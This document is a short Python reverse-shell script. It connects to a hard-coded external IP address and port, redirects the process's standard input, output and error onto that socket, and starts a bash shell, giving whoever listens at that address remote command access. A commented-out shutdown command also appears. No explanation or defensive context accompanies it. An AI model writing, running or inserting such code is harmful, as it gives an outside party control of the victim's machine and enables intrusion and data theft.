import socket,subprocess,os,time
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("147.185.221.20",26712))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
#import subprocess
#shutdown /s


subprocess = subprocess.Popen(["bash"], stdin=None, stdout=None, stderr=None, close_fds=True)
subprocess.daemon = True

